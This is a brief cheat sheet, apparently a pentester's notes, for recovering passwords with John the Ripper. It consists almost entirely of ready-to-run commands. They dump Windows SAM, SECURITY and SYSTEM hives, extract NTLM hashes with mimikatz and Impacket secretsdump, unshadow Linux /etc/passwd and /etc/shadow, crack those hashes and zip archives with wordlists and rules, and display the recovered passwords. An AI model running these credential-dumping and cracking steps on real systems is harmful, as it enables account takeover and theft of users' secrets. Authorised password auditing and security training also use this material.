# John the Ripper

## Windows

### Obtain sam, system and security files
    reg save HKLM\sam sam
    reg save HKLM\security security
    reg save HKLM\system system

### Obtain hashes using mimikatz
    privilege::debug
    token::elevate
    lsadump::sam /sam:sam /system:system

Copy and paste NTLM hash(es) into a text file

### Obtain hashes using Impacket
    impacket-secretsdump -sam sam -system system LOCAL > hashes.txt

### Hit it with john
    john --wordlist=passwords.txt --format=NT hashes.txt


### Single password hash 
    john --format=lm hash.txt

## Linux
### Unshadow and crack:
    unshadow /etc/passwd /etc/shadow > unshadowed.txt
    john -single --format=crypt unshadowed.txt

### With custom wordlist and mangling:
    john --wordlist=passwords.txt --format=crypt unshadowed.txt
    john --wordlist=passwords.txt --rules --format=crypt unshadowed.txt


### Cracking for specific shells (1) and users (2)
    john --wordlist=passwords.txt --rules --shell=bash,sh unshadowed.txt --format=crypt
    john --wordlist=passwords.txt --rules --users=admin,mark unshadowed.txt --format=crypt

### Restart a session aborted with Ctrl-C:
    john -restore

### Show cracked passwords:
    john --show unshadowed.txt


## Password protected zip
    zip2john archive.zip > hash.txt
    john hash.txt